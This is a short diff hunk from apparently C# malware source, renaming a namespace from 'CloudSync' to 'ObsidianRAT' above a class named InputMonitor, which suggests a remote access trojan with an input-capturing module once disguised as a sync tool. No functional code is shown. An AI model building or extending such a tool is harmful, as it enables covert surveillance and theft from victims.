@@ -6,7 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace CloudSync.Services.Modules
+namespace ObsidianRAT.Services.Modules
 {
     public class InputMonitor
     {
